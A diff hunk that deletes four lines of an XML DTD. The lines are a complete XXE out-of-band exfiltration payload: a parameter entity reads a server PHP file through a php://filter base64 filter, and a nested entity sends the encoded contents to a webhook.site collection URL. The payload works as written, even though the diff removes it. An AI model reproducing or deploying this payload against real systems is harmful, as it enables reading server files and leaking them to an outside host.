@@ -1,4 +1,0 @@
-<!ENTITY % a SYSTEM “php://filter/convert.base64-encode/resource=/var/www/me.terahost.exam/info.php”>
-<!ENTITY % b “<!ENTITY &#x25; c SYSTEM ‘https://webhook.site/a4da61e5-42d9-4cd3-b926-538b0fa66ee6/?output=%a;'>”>
-%b;
-%c;
